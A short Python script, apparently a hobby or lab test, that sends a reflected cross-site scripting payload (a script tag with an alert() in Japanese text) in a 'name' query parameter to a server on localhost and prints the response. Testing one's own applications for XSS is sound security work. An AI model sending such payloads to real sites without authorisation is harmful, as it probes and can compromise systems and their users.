import requests

def xss_attack(target_url):
    payload = "<script>alert('999号参上♡');</script>"
    url = f"{target_url}?name={payload}"
    print(f"🚨 攻撃中：{url}")
    res = requests.get(url)
    print(res.text)

if __name__ == "__main__":
    xss_attack("http://localhost:8080")